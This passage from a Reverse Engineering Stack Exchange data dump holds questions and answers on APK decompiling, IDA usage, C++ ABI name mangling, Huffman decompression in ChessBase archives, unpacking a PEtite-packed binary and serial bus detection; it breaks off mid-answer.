","<p>There's a nice blog entry on it here: <a href=""http://www.singlehop.com/blog/binary-vivisection-part-1/"" rel=""nofollow"">http://www.singlehop.com/blog/binary-vivisection-part-1/</a></p>

<blockquote>
  <p>...</p>
  
  <p>While looking over the changelog and documentation, I realized that
  there doesn’t really seem to be a good tutorial or primer for getting
  familiar with the <strong>Vivisect</strong> framework so hopefully we can remediate
  that today.  In this series, we’ll be covering the usage of VDB
  (dynamic debugging component) and <strong>vivisect</strong> (static analysis tool).</p>
  
  <p>...</p>
</blockquote>

<p>You can also see the <code>README</code> file <a href=""https://code.google.com/p/vtrace-mirror/source/browse/trunk/README-vivisect"" rel=""nofollow"">here</a>, and some related scripts <a href=""https://github.com/pdasilva/vtrace_scripts"" rel=""nofollow"">here</a>.</p>
","2863"
"Error decompiling apk","1032","","<p>Ive a problem.
I am unable to decompile a game apk successfully. I am using apktool. 
I get many errors and but i get thw files. But then many of its smali files doesnt have a .end method in its code which makes a recompile impossible.</p>

<p>Can someone help me or decompile it?</p>

<p>Its this file <a href=""https://www.dropbox.com/s/05kj2x4zie734b9/com.asobimo.iruna_en-1.apk?dl=0"" rel=""nofollow"">https://www.dropbox.com/s/05kj2x4zie734b9/com.asobimo.iruna_en-1.apk?dl=0</a></p>

<p>Thanks in advance </p>

<p>//Edit: I figured out why it didnt work as I wanted to. The game has some kind of protection in apk since this year. So I used an older version of apk from 2014, and edited its files and set its version to actual version with APK Edit v0.4. Then save new apk and im fine =)
Thanks though for you help</p>
","<p>For various reasons, it is generally not possible to decompile a non-trivial program to the point where it can be correctly recompiled. Among other things, there's a lot of things you can do in bytecode that don't correspond to Java language features, and even in the ideal case, it is hard to restructure certain complex code. </p>

<p>Decompilation is useful for understanding code, but if you want to edit it, you need to learn how to patch things at the bytecode level. The easiest way to do this for APKs is using baksmali. </p>

<p>Running baksmali gives you a directory with a smali file for each class in the dex file. You can then edit the smali to make the changes you want, and run smali to reassemble everything into a new dex file. Then of course you have to add your <code>classes.dex</code> back into the apk, then sign and format it.</p>
","8184"
"File Reverse Engineering – League of Legends WAD File Header Hash","1030","","<p>I'm looking to edit League of Legends's WAD files, but the developers of the game have recently decided to add a sort of hash to these files to check if their content is valid. Unfortunately, no one has been able to crack the code yet. I'm hoping someone might have at least an idea on what it could be.</p>

<p>Here are a few files that I extracted (the ones in the ""old"" directory are older files that also have a hash that you can use for comparison):
<a href=""https://drive.google.com/file/d/0B5fV4q6wLg7bTUE2VHc5aW5Ca00"" rel=""nofollow noreferrer"">https://drive.google.com/file/d/0B5fV4q6wLg7bTUE2VHc5aW5Ca00</a></p>

<p>The unknown ""hash"" value is bytes 4 to 87 (84 bytes long). I looked at <a href=""https://github.com/Pupix/lol-wad-parser"" rel=""nofollow noreferrer"">this GitHub project</a> to get started, but the person that wrote the code does not seem to know what that header means either. What I also found odd about the header is that it seems to vary in length (the end is padded with a different amount of null values in some files). At first I thought they might be using a variant of SHA or another hashing algorithm, but I'm no longer sure if that is the case because of the varying length, and I am definitely not a hashing professional.</p>

<p>If it helps, you can also download the ""Wooxy"" program, a League of Legends file extractor/editor program, to extract, edit, and update the game files yourself.</p>

<p>Even if you don't know the exact answer, any bit of help is highly appreciated!</p>

<p><strong>EDIT:</strong> This is what appears in the game's log when it attempts to load an edited WAD file:</p>

<pre><code>000036.460|  ERROR| ?:0: attempt to call global 'GetHashedGameObjName' (a nil value)
000037.499| ALWAYS| Begin Game Object Update
000037.936| ALWAYS| WadFile mount: DATA/FINAL/Champions/Chogath.wad (FAILED)
000037.937| ALWAYS| Riot::RADS::Reader::SignalSoftRepair: Wrote soft repair file to C:/Riot Games/League of Legends/RADS/solutions/lol_game_client_sln/releases/0.0.1.163/SOFT_REPAIR. This will cause the patcher to repair your installation.
000037.937|  ERROR| Assertion failed!

Expression: ALE-18967997

Description: FATAL ERROR - WadFile mount failed: Champions/Chogath.wad
000039.411|  ERROR| Crash Occurred
</code></pre>

<p><strong>EDIT 2:</strong> There also seems to be an unknown value between bytes 88 and 95 (8 bytes long). Changing the bytes doesn't seem to crash the game, though.</p>

<p><strong>EDIT 3:</strong> I found out that the header looks like it's separated into 2 parts. Byte 4 indicates the total length of the header (without <code>00</code> padding). Byte 8 indicates the length of the first ""chunk"". After that amount of bytes, there is a <code>02</code>, and the byte after that indicates the length of the second ""chunk"". After that second bit, there are <code>00</code>s until byte 87.</p>
","<p>Turns out the header is actually a ECDSA public key and signature, so, according to what I've read, it's basically impossible to modify the file without re-signing it with the private key (which I do not have).</p>
","14797"
"Can a debug-apk be reverse engineered to make it a release-apk?","1028","","<p>I am making a system in which the users can create Android applications. I want them to give an option to download a <a href=""http://developer.android.com/tools/building/building-cmdline.html#DebugMode"" rel=""nofollow"">debug apk</a> so that they can try it out first. After that, they have to pay for it to get the <a href=""http://developer.android.com/tools/building/building-cmdline.html#ReleaseMode"" rel=""nofollow"">apk in release mode</a>, so that it can be distributed in the Google Play Store.</p>

<p>I of course don't want them to be able to reverse-engineer the debug apk so that they can extract the needed files from it and then sign it themselves. Hence my question: </p>

<p><strong>Is it possible to reverse engineer a debug apk to extract the classes and everything needed to build it in release mode?</strong></p>

<p>If so, would there be any way to secure the debug versions so that it isn't possible anymore?</p>
","<p>The difference between a debug apk and a release apk is that a debug apk is signed by a particular key which is provided with the SDK, whereas a release apk is signed by some other key. There's nothing to reverse engineer: all you have to do to make a release apk and sign it.</p>

<p>Nobody but you can create an apk signed by you. But anyone can make their own release apk by signing them.</p>

<p>A solution in your case would be to produce a binary including some DRM and refuse to run except on your customer's pre-registered device. How to implement such DRM, especially while letting your customer debug his applications, is left as an exercise to the reader.</p>
","2225"
"How to do static analysis to identify pointer from concrete value in assembly?","1028","","<p>So basically I am writing some code to do analysis work on disassembled assembly code.</p>

<p>I am trapped in this issue for a while, here is an simple example of a disassembled asm code by objdump, basically all the address symbols have been translated into concrete value.</p>

<pre><code>1. mov 0x8408080, %eax
2. ....
3. call *%eax
</code></pre>

<p>So basically for the above example, it is easy to determine that <code>0x8408080</code> used in line 1 is an address of code, and I know it is relatively easy to heuristically consider all the value falling into the range of <code>.text section</code> as a pointer. </p>

<p>However, how to use static analysis to automatically identify this issue? (I want to write a tool to analyze large amount of code as accurate as possible)</p>

<p>I know somehow I should use <strong>constant propagation</strong> to forwardly do the analysis, but  basically as I am new to program analysis, I just don't know actually where to start..</p>

<p>Does anyone have experiences like this? Or is there any implemented tools I can look for help..?</p>
","<p>Some decompilers (<a href=""http://users.ece.cmu.edu/~ejschwar/pres/usenix13.pdf"" rel=""nofollow"">phoenix</a> for example) use <a href=""http://pages.cs.wisc.edu/~bgogul/Research/Papers/cc04.pdf"" rel=""nofollow"">Value Set Analysis</a> to recover the cfg.</p>

<h1>Paper Abstract</h1>

<blockquote>
  <p>This paper concerns static-analysis algorithms for analyzing binary executables. The aim of the work is to recover intermediate representations (IRs) that are similar to those that can be created for a program written in a high-level language. Our goal is to perform this task for programs such as viruses, worms, and mobile code. For such programs, symbol-table and debugging information is either entirely absent, or cannot be relied upon if present; hence, the analysis described in the paper makes no use of symbol-table/debugging information.</p>
</blockquote>

<p>The main analysis discussed in the paper, called <em>value-set analysis</em>, tracks address-valued and integer-valued quantities simultaneously. It is related to pointer-analysis algorithms that have been developed for programs written in high-level languages, which determine an over-approximation of the set of variables whose addresses each pointer variable can hold. At the same time, value-set analysis is similar to range analysis and other numeric static-analysis algorithms that over-approximate the integer values that each variable can hold.</p>

<p>The techniques described in the paper have been implemented as part of CodeSurfer/x86, a prototype tool for browsing (``surfing''), inspecting, and analyzing x86 executables.</p>
","5986"
"How can I change the value of a variable while debugging?","1027","","<p>I know that I can output the value of a variable using </p>

<pre><code>(gdb) p var_name
$1 = ""varvalue""
</code></pre>

<p>Is there a way to set the value of a variable while debugging with gdb? The document that I'm using doesn't seem to have this command. </p>

<p><strong>Edit</strong></p>

<p>I've since learned that I can change the state of objects in memory by simply calling their functions! So to modify an object of type <code>std::string</code>, just call the <code>assign</code> function as follows:</p>

<pre><code>(gdb) call str.assign(""New Value"")
</code></pre>

<p>Thank you.</p>
","<p>Google is your friend:</p>

<blockquote>
  <p>For example, if your program has a variable width, you
  get an error if you try to set a new value with just `set width=13',
  because GDB has the command set width:</p>
</blockquote>

<pre>
(gdb) whatis width  
type = double   
(gdb) p width $4 = 13  
(gdb) set width=47  
Invalid syntax in expression. 
</pre>

<blockquote>
  <p>The invalid expression, of course, is `=47'. In order to actually set
  the program's variable width, use</p>
</blockquote>

<pre>
(gdb) set var width=47
</pre>

<p>You can find the needed information in the <a href=""http://www.delorie.com/gnu/docs/gdb/gdb_118.html"" rel=""nofollow"">following document</a>:</p>
","6934"
"How do you manage/backup your IDA database?","1026","","<p>Recently I lost an important IDA database. Up until now, I manually made a copy of my work IDB every day, but that's obviously not a good backup technique. I was wondering how do you manage/backup your IDB. Like make a copy of the current IDB every minute or something like that.</p>
","<p>The recently added <a href=""http://www.hexblog.com/?p=415"" rel=""nofollow noreferrer"">database snapshot feature</a> allows you to set up periodical snapshots of your database.</p>

<p><img src=""https://i.stack.imgur.com/NDVrj.png"" alt=""IDA Database snapshot manager""></p>
","3453"
"What is _S_empty_rep_storage used for in this code?","1026","","<p>While reversing a C++ program compiled with g++, I've seen a _ZNSs4_Rep20_S_empty_rep_storageE being used. Running it through c++filt shows that before mangling it's a: </p>

<pre><code>std::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_Rep::_S_empty_rep_storage
</code></pre>

<p>But what is this _S_empty_rep_storage used for? I included an assembly snippet below where it's used:</p>

<pre><code>mov     rax, cs:_ZNSs4_Rep20_S_empty_rep_storageE_ptr
...
add     rax, 18h
...
mov     [rsp+328h+var_308], rax
mov     [rsp+328h+var_2F8], rax
mov     [rsp+328h+var_2E8], rax
...
lea     r14, [rsp+328h+var_308]
lea     rsi, [rsp+328h+var_2D8] ; std::string *
mov     rdi, r14        ; this
call    __ZNSs4swapERSs ; std::string::swap(std::string &amp;)
lea     rdi, [rsp+328h+var_2D8] ; this
lea     r13, [rsp+328h+var_2F8]
lea     r12, [rsp+328h+var_2E8]
call    __ZNSsD1Ev      ; std::string::~string()
</code></pre>

<p>So my question is: What's the purpose of _S_empty_rep_storage here? Also why are var_308, var_2f8 and var_2e8 lea'd into r12-14? These registers are not used later on.</p>
","<p>Check the comments at the beginning of libstdc++'s <a href=""https://gcc.gnu.org/onlinedocs/gcc-4.8.1/libstdc++/api/a01053_source.html"" rel=""nofollow""><code>basic_string.h</code></a> to see how GCC's <code>std::string</code> works.Basically, <code>_S_empty_rep_storage</code> is a pre-initialized (in fact, zeroed out) representation of an empty string, used to initialize the string in a default constructor. So <code>var_308</code>, <code>var_2F8</code> and <code>var_2E8</code> are three std::string objects, initialized to an empty string.</p>

<p>As for r12-r14, they seem to be used as temporary variables. We can at leas see that <code>r14</code> is used to initialize <code>rdi</code> - the <code>this</code> pointer for the <code>std::string::swap()</code> call, so presumably <code>r12</code> and <code>r13</code> are also used later.</p>
","10724"
"Why two virtual destructors?","1026","","<p>The beginning of the virtual function table (VFT, also virtual method table, VMT) disasembled by IDA goes as:</p>

<pre><code> _ZTV13QSystemLocale DCD 0, _ZTI13QSystemLocale, _ZN13QSystemLocaleD2Ev+1, _ZN13QSystemLocaleD0Ev+1
</code></pre>

<p>and <code>c++filt</code> decodes it as</p>

<pre><code> vtable for QSystemLocale DCD 0, typeinfo for QSystemLocale, QSystemLocale::~QSystemLocale()+1, QSystemLocale::~QSystemLocale()+1
</code></pre>

<p>Here we see <code>_ZN13QSystemLocaleD2Ev</code> and <code>_ZN13QSystemLocaleD0Ev</code>, both transformed by <code>c++filt</code> to <code>QSystemLocale::~QSystemLocale()</code>.</p>

<p>(+1 is normal, the bit selects the right instruction set on ARM).</p>

<p>The Qt source declares:</p>

<pre><code>virtual ~QSystemLocale();
</code></pre>

<p><strong><em>Why there are two virtual destructors?</em></strong></p>

<p>(I work with ARM, Android NDK (gcc/g++), C++, Qt).</p>
","<p>According to <a href=""http://www.swag.uwaterloo.ca/acd/docs/ItaniumC++ABI.htm#mangling"">documentation</a> the first one is base object destructor and the second one is deleting destructor. </p>

<pre><code>Constructors and destructors are simply special cases of &lt;unqualified-name&gt;, where the final &lt;unqualified-name&gt; of a nested name is replaced by one of the following:


  &lt;ctor-dtor-name&gt; ::= C1   # complete object constructor
           ::= C2   # base object constructor
           ::= C3   # complete object allocating constructor
           ::= D0   # deleting destructor
           ::= D1   # complete object destructor
           ::= D2   # base object destructor
</code></pre>

<p>According to <a href=""http://infocenter.arm.com/help/topic/com.arm.doc.ihi0041d/IHI0041D_cppabi.pdf"">ARM IHI 0041D</a> document the difference between these destructors is as follows:</p>

<pre><code>This ABI requires C1 and C2 constructors to return this (instead of being void functions) so that a C3 constructor
can tail call the C1 constructor and the C1 constructor can tail call C2.
Similarly, we require D2 and D1 to return this so that D0 need not save and restore this and D1 can tail call D2 (if
there are no virtual bases). D0 is still a void function.
</code></pre>
","4325"
"Unknown decompression algorithm","1025","","<p>I work on the reverse engineering of the ChessBase archive (.cbv).</p>

<p>I found the general structure of the file and can already decompress some files.</p>

<p>You can see my current work <a href=""https://github.com/antoyo/uncbv"" rel=""noreferrer"">here</a>.</p>

<p>However, some .cbv files that are bigger seems to use a second compression algorithm.</p>

<p>I was able to find the first compression algorithm by debugging the <a href=""http://download.chessbase.com/Download/ChessBaseReader/Setup.msi"" rel=""noreferrer"">ChessBase Reader 2013</a> software, but I cannot make sense of the second compression algorithm.</p>

<p>I tried some tools like <code>signsrch</code> to find out what algorithm was used without any luck: it seems to be a custom algorithm.</p>

<p>Here is a <a href=""http://en.chessbase.com/portals/4/files/news/2014/common/cbm/cbm163/CBM163D85.cbv"" rel=""noreferrer"">file</a> that I am able to partly decompress with my <a href=""https://github.com/antoyo/uncbv"" rel=""noreferrer"">tool</a> (my tool will print <code>What to do?</code> when it detects that the unknown compression algorith was used).</p>

<p>Do you have any idea of what compression algorithm is used?</p>

<p>If not, do you have any way of finding it by looking at the compressed file?</p>

<p>I am able to create archives so I can have files that are both compressed and not: I wonder if there is any way to find a compression pattern in such a situation.</p>
","<p>After downloading ChessBase Reader and playing with ProcMon a bit to find the function that reads the archive and writes the data file, i loaded up the whole thing in IDA to analyze it. The data is <a href=""http://en.wikipedia.org/wiki/Huffman_coding"" rel=""nofollow"">Huffman-coded.</a> </p>

<p>Each data block has the following structure. Note that Huffman compression works with bits, not bytes, so each size in the following table is in bits as well. The block length is 16 bits, or 2 bytes, for example.</p>

<pre><code>+----------------------------------------------+
|                                              |
|16 bits - uncompressed block length (len)     |
|                                              |
+-----------+----------------------------------+
|           |                                  |
|Repeat     |  4 bits - length of entry (n)    |
|256        |                                  |
|times      +----------------------------------+
|           |                                  |
|one entry  |  n bits - tree left/right        |
|per byte   |  information for this byte       |
|(0-255)    |                                  |
|           |                                  |
+-----------+----------------------------------+
|                                              |
| Huffman encoded bit sequences. The number of |
| bits isn't stored anywhere, but the number   |
| of sequences, which is equal to the number   |
| of output bytes, is the block length (len)   |
|                                              |
+----------------------------------------------+
</code></pre>

<p>Assuming the word ""foobar"" was coded in this scheme, this would possibly  result in (i made up the bit values for the characters):</p>

<pre><code>+----------------+
|Huffman code for|
|character   is  |
+--------+-------+
|        |       |
| o      |   0   |
| f      |   100 |
| b      |   101 |
| a      |   110 |
| r      |   111 |
|        |       |
+--------+-------+
</code></pre>

<p>This would result in the word foobar being coded as
<code>100 0 0 101 110 111</code>. The length is 6 bytes, or <code>0000 0000 0000 0110</code> in 16 bits.</p>

<p>The bitarray for <code>foobar</code>, formatted to the above table, would read</p>

<pre><code>0000 0000 0000 0110                      (16 bit output length)
.....    array index   0 for byte '\0'
.....    array index   1 for byte '\1'
.....
0011 110 array index  97 for byte 'a'    (3 bits)
0011 101 array index  98 for byte 'b'    (3 bits)
.....
0011 100 array index 102 for byte 'f'    (3 bits)
.....
0001 0   array index 111 for byte 'o'    (1 bit)
.....
0011 101 array index 114 for byte 'r'    (3 bits)
.....                                    remaining bit combos - 255

100 0 0 101 110 111                      foobar text
</code></pre>

<p>The implementation builds a binary tree from the code table. When it reads the data, it starts at the root of the tree; each bit moves down the tree, to the left or right, depending on the next bit value. When a leaf is reached, the corresponding byte is being output. This repeats until the length of the output stream is reached.</p>

<p>The related functions from the binary are these:</p>

<p><code>BECAA0</code>: decodes the archive data. Reads 16 bits for the length; then reads the encoding table into two arrays at offsets <code>080A</code> (bits) and <code>0E10</code> (bit lengths) within the decoder class. After this, call <code>BEC930</code> to decode the data bytes.</p>

<p><code>BEBF30</code>: One parameter (number of bits), gets this many bits from the input array. At the end of the function, the word at offset <code>1014</code> has these bits.</p>

<p><code>BEBAD0</code>: Builds the tree from the arrays at <code>080A</code> and <code>0E10</code></p>

<p><code>BEC930</code>: Calls <code>BEBAD0</code> to build the tree, then reads the remaining bits from the input stream. Walks the tree for each bit; emits a byte when a leaf is found. At the end, calls <code>BEBA90</code> to destroy the tree.</p>

<p><code>BEBA90</code>: Recursively delete a node by deleting the left and right children, the the node itself.</p>

<p>I don't think debugging the writer would be easier if you want to read the files; compression has a lot of logic and data structures, and knowing how 'one way' works doesn't neccesarily help you with the other way round. In this case, luckily, its a well known algorithm, but if the algorithm is unknown it can be quite hard to compress effectively if you just know how to decompress.</p>
","8601"
"IDA and XRefs in the .data Section","1022","","<p>When using IDA, I can press <kbd>x</kbd> on any subroutine to see where it is called from. Eventually I end up in the <code>.data</code> section. </p>

<p>But, what am I looking at when I get to this point ? </p>

<p>Are these exports offered by the <code>.dll</code> that I'm looking at ? And, if I get to this point, is it safe to assume that there are no other calls to my function (with the exception of dynamically-generated and/or external calls) ? See reference image below for context.</p>

<p><img src=""https://i.imgur.com/9F4Mh9G.png"" alt=""XRefs""></p>
","<p>It's hard to tell without more context, but you're probably looking at a <a href=""http://en.wikipedia.org/wiki/Virtual_method_table"" rel=""nofollow noreferrer"">virtual function table (vtable)</a>. See <a href=""https://reverseengineering.stackexchange.com/questions/3116/converting-a-virtual-table-from-rdata-into-an-ida-struct"">Converting a virtual table from .rdata into an IDA struct</a> for an example.</p>
","4399"
"What is the meaning of this code generated by IDA Pro?","1022","","<p>Test platform is Linux 32 bit.</p>

<p>I use IDA Pro to disassembly the basename from coreutils 8.5
 compiled by gcc 4.6.3</p>

<p>Here is a code snippet generated by IDA Pro</p>

<pre><code>           call    _i686_get_pc_thunk_bx                                 
           add     ebx, 292Eh
           sub     esp, 18h
           mov     eax, ds:(__dso_handle_ptr - 804DFF4h[ebx]
           test    eax, eax
           jz      short loc_804B6F8
           mov     eax, [eax]

     loc_804B6DB:
           mov     [esp+1Ch+var_14], eax
           mov     eax, [esp+1Ch+arg_0]
           mov     dword [esp+1Ch+var_18], 0
           mov     [esp+1Ch+var_1C], eax
           call    __cxa_atexit
           add     esp, 18h
           pop     ebx
           retn

     loc_804B6F8:
           xor     eax, eax
           jmp     short loc_804B6DB
</code></pre>

<p>I don't understand this line:</p>

<pre><code>mov     eax, ds:(__dso_handle_ptr - 804DFF4h[ebx]
</code></pre>

<p>and after searching the code, I can only find this:</p>

<pre><code>        __dso_handle    dd 0
</code></pre>

<p>in the .data section.</p>

<p>So my questions are:</p>

<ol>
<li>What is the meaning of this line..?  Is it like a version checking stuff..?</li>
<li>Can I just safely remove this line without affecting the functionality of the code..?</li>
</ol>
","<p>You are looking at binary that is compiled as position-independent code. The <code>call    _i686_get_pc_thunk_bx</code> and the following addition to <code>ebx</code> shows just that. If you take a look at the disassembly, you'll see that the address of the <code>add ebx, 292Eh</code> plus 0x292E will result in the first address of the GOT. That why in the next line, _dso_handle_ptr is addressed in such a ""funny"" way.</p>

<p>IDA however is nice enough to show you this in the disassembly as you would normally only see 0xSOMEADDR[ebx]. </p>

<p>In terms of the second question: that line retrieves a global variable, puts it into <code>eax</code> and then checks if it is zero or not. So, you should not just ""delete"" that line since then the <code>test eax, eax</code> would use some old value of <code>eax</code> (which I am sure you will not like all that much).</p>
","3633"
"GCC Loop optimization","1021","","<p>I have been looking at some simple C code and the different output from GCC using different optimization levels.</p>

<p><strong>C code</strong></p>

<pre><code>#include &lt;stdio.h&gt;

int main() {
    int i = 0;

    while(i&lt;10) {
            printf(""Hello\n"");
            i++;
    }

    i = 0;

    while(i&lt;10) {
            printf(""i: %d\n"", i);
            i++;
    }
</code></pre>

<p>}</p>

<p>When I compile the code using <code>-Os</code> or <code>-O2</code> the first loop works a bit differently. It it decrements instead of incrementing, and it is in two different ways. I am wondering why it decrements instead of incrementing like in the code, and the the small difference between <code>-Os</code> and <code>-O2</code>.</p>

<p><strong>-Os compiled</strong></p>

<pre><code>0x400486 &lt;main+6&gt;       mov     edi,0x40068c
0x40048b &lt;main+11&gt;      call    0x400450 &lt;puts@plt&gt;
0x400490 &lt;main+16&gt;      dec     ebx
0x400492 &lt;main+18&gt;      jne     0x400486 &lt;main+6&gt;
</code></pre>

<p><strong>-O2 compiled</strong></p>

<pre><code>0x400490 &lt;main+16&gt;      mov    edi,0x40069c
0x400495 &lt;main+21&gt;      call   0x400450 &lt;puts@plt&gt;
0x40049a &lt;main+26&gt;      sub    ebx,0x1
0x40049d &lt;main+29&gt;      jne    0x400490 &lt;main+16&gt; 
</code></pre>
","<p>By decrementing, compiler can make use of <code>jne</code> (jump if not equal/zero) which does the comparison (to zero) and jump in a single instruction. In case of incrementing, it would have to do a <code>cmp/test</code> (with 10) and then a conditional jump like <code>jnz/jne</code>. I believe it is a part of optimization.</p>

<p><code>-Os</code> flag optimizes to bring down the code size. The code generated using <code>-Os</code> uses <code>dec ebx</code> instead of <code>sub ebx, 0x1</code>, since <code>dec ebx</code> is a 2-byte instruction while <code>sub ebx, 0x1</code> is a 3-byte instruction (Note the address at which the next instruction begins). That explains the small difference.</p>
","3847"
"Why doesn't Olly's analyzation work properly in this code section?","1021","","<p>I'm not sure if there are any legal hinderances to me asking this question, so if asking for unpacking advice is against the rules I apologize.</p>

<p>I am new to reverse engineering and trying to manually unpack a PEtite 2.2/2.3 as a learning experience and have been trying to follow this guide: <a href=""http://users.freenet.am/~softland/tutorials/Petite.v2.3.MUP.txt"" rel=""nofollow noreferrer"">http://users.freenet.am/~softland/tutorials/Petite.v2.3.MUP.txt</a>. The program I'm unpacking is the original PEtite packer itself.</p>

<p>I have disabled passing on exceptions as it feels like cheating and I haven't fully grasped how exceptions work in this context, seemingly used here to derail the debugger, so I'd like to know why and how to work around it myself. I've come to this part in the guide:</p>

<pre><code>and this exception program generates for jumping to exception handler, so at that line put
breakpoint on exception handler (goto to 4164E3 and press F2), then press SHIFT+F9 and
you are at the beginning of exception handle
</code></pre>

<p>When using OllyDbg 1.10 (non-patched), this is what I find at the address of the exception handler (this address is also where Olly said the OEP would be when I tried out the auto-unpacker SFX ability):</p>

<p><img src=""https://i.stack.imgur.com/V6AAr.png"" alt=""enter image description here""></p>

<p>In the guide it says that I should find the line <code>004164E3 CALL    PETGUI.00416537</code> here. As you can see there is really nothing here, however it was the address I always ended up at no matter the method I tried to use (or saw in tutorials etc.), so I did a process dump and suddenly I got this:</p>

<p><img src=""https://i.stack.imgur.com/zAa8k.png"" alt=""enter image description here""></p>

<p>Now it struck me that since the program is self-modifying that might naturally confuse Olly, so I told Olly to re-analyze the code (before dumping the process), and I ended up with this:</p>

<p><img src=""https://i.stack.imgur.com/AcIbr.png"" alt=""enter image description here""></p>

<p>I got the expected result, but there's something missing... the <code>CALL</code> instruction can be seen in the opcode section but it hasn't been parsed by Olly. Now to my questions:</p>

<ol>
<li>Why doesn't Olly parse this <code>CALL</code> instruction properly?</li>
<li>How come <code>E8 4F000000</code> somehow magically becomes <code>CALL 416537</code>? I don't see any <code>416537</code> in the opcodes. Found this answered here, leaving it for reference: <a href=""https://stackoverflow.com/questions/10376787/need-help-understanding-e8-asm-call-instruction-x86"">https://stackoverflow.com/questions/10376787/need-help-understanding-e8-asm-call-instruction-x86</a>.</li>
<li>At the <code>MOVS</code> instruction where the exception is raised before ending up in the exception handler, if I press <code>Shift-F7</code> or <code>Shift-F8</code> to single-step instead of <code>Shift-F9</code> I somehow end up at 4E3137 which is full of <code>ADD BYTE PTR DS:[EAX], AL</code> instructions, presumably an area of filler instructions that will later be overwritten. How come I ended up here? If I try to keep stepping I'm told <code>EIP</code> is set to <code>00000000</code> and can't proceed. This seems to be the case whenever I choose to exception-single step; errors show up that would be smoothly ignored if I had just used <code>Shift-F9</code>.</li>
</ol>

<p>I have the same problem in OllyDbg 2.01 aswell.</p>
","<p>Because the code at 0x4164e3 is never referenced in a CALL or JMP instruction, but (probably) used as data somewhere else (as you said the program is self-modifying), Olly thinks it's data, and has no reason to assume there's code there. See <a href=""https://stackoverflow.com/questions/13812554/in-ollydbg-how-do-you-force-hint-disassembly-at-a-location"">https://stackoverflow.com/questions/13812554/in-ollydbg-how-do-you-force-hint-disassembly-at-a-location</a> for how to make sure olly treats that address as code.</p>

<p>(In case the link goes away: Right Click -> Analysis -> During Next analysis, treat selection as -> Command, Or at least ""remove analysis from section"" to tell olly NOT to assume data.)</p>

<p>The problem with single-stepping exception handlers is: If you do any kind of single-stepping, the debugger will place a breakpoint at the next instruction, execute the code at the current instruction, and hope for the breakpoint to return control to the debugger. However, the exception will call the exception handler, but the debugger doesn't even know the instruction is going to raise an exception, so it can't put the breakpoint at the exception handler's address. So, your single-step executes the exception handler (without returning to the debugger), which probably checks for the breakpoint after the instruction it came from (to actively detect a debugger) and, if it detects a debugger, jumps to ""nowhere"" to make the program crash/confuse the debugger user.</p>

<p>There are lots of explanations on the internet that are more thorough than what i could write in a short answer, googling for ""exception handler single step"" brings up a few nice examples.</p>
","6355"
"IDA Pro: Side effects or disadvantages of ""Create function""","1019","","<p>Some instructions in a binary do not belong to a function, or, IDA does not manage to recover one. See for example the red addresses in the below screen shot.</p>

<p>Yet, one can right-click such 'function-less' addresses and selct <code>Create function</code> from the menu (see below screenshot).</p>

<p>Are there any side effects of creating a function from 'function-less' instructions? For example, does it change instructions, symbols, variables, etc.? Does it change IDA-generated xrefs and thus has an effects on a static control flow analysis?</p>

<p>I am asking because I have to work with an algorithm that can only process instructions which belongs to a function. My idea was to go through the binary and keep creating functions until all 'function-less' instructions belong to a function. </p>

<p>Do you see any possible disadvantages of this approach?</p>

<p><img src=""https://i.stack.imgur.com/ul8Al.png"" alt=""enter image description here""></p>
","<p>Depends on what you would call a disadvantage. This kind of code-relict often results from a function that's present in source code, but doesn't ever get called*, so IDA didn't assign a name to it. If this is the case, you:</p>

<ul>
<li>generally don't want to include the function in your analysis, because the program never uses it anyways</li>
<li>can search for a longer sequence of functions that are unused**, which might identify whole source files that got linked in accidentially but aren't used in the program</li>
<li>can use the space of these functions for code caves that ""enhance"" the program's functionality; for example, i sometimes use them for a sequence of open/write/close calls that log some intermediate values.</li>
</ul>

<p>You sabotage this by making unused functions real functions, which may or may not be important to your use case.</p>

<p>(*) However, the function might be a class method, which is referenced from the vtable, but never called directly, which misleads IDA</p>

<p>(**) If you have two functions <code>a</code> and <code>b</code>, both of which get never called from the outside, but <code>a</code> calls <code>b</code>, IDA will still give <code>b</code> a <code>sub_</code> name, which interferes with identifying unused functions</p>
","9009"
"Is there a collaborative reversing forum for people that deal with firmware?","1016","","<p>The question pretty much says it.  Beyond knowing people that are interested in the same things, is there a collaborative reversing dumping ground for documenting specifically disassembly of closed source firmware?</p>
","<p>I am not aware of a currently active generic ""firmware reversing"" forum.</p>

<p>A few years ago there was a pretty ambitious attempt with <a href=""http://wayback.archive.org/web/20100514210317/http://lostscrews.com/"">lostscrews.com</a> but unfortunately it languished due to lack of attention, got overwhelmed with spam and eventually the domain has expired. I think the guys behind the <a href=""http://www.devttys0.com/blog/"">/dev/ttyS0 blog</a> also tried opening a forum a couple months ago but it wasn't very active and apparently has been closed down.</p>

<p>I guess the problem is that the area is somewhat nebulous and trying to cover everything won't really work. However, there are numerous forums that specialize in a specific type of firmware, manufacturer, or even just one product, and some of them are pretty big on their own. Here's a few examples that come to mind:</p>

<ul>
<li><a href=""http://forum.xda-developers.com/"">XDA Developers</a>: everything about hacking Android and Windows Mobile-based phones and other devices.</li>
<li>PC BIOS hacking: <a href=""http://www.wimsbios.com/forum/"">Wim's BIOS</a> and <a href=""http://forums.mydigitallife.info/forums/25-BIOS-Mods"">My Digital Life</a>.</li>
<li>Samsung TVs: <a href=""http://forum.samygo.tv/"">SamyGO TV</a>.</li>
<li>Digital cameras: <a href=""http://chdk.setepontos.com/"">CHDK</a>, <a href=""http://www.magiclantern.fm/forum/index.php"">Magic Lantern</a>, <a href=""http://nikonhacker.com/"">Nikon Hacker</a>.</li>
<li>Ebook readers: <a href=""http://www.mobileread.com/forums/"">MobileRead</a></li>
<li>Audio players: <a href=""http://forums.rockbox.org/"">Rockbox</a></li>
<li>Wireless routers: <a href=""http://en.wikipedia.org/wiki/List_of_wireless_router_firmware_projects"">too many to list here</a>.</li>
<li>iPhone/iPod/iPad: <a href=""http://www.idroidproject.org/forum/"">iDroid Project</a> (and many others)</li>
<li>and so on.</li>
</ul>
","1776"
"Determining RS232 bus settings","1015","","<p>I have a device with two chips without part numbers. It looks like their using RS232 for serial communication (proper setup, right voltage), but I do not know the bus settings (speed, parity, etc.). Is there any way to determine the bus settings without brute force (trying everything)? </p>

<p>I have a multimeter and an oscilloscope on my workbench.</p>
","<p>If you have an oscilloscope, it should be pretty easy to determine at least the baud rate. Then you just need to play with the parity and stop bits.</p>

<p>If you don't have it, there's no real way around bruteforce. However, usually you don't have to try all combinations.</p>

<ul>
<li>probably at least 90% embedded devices I've seen use 115200-8-N-1 (115200 baud, 8 data bits, no parity, 1 stop bit), no flow control.</li>
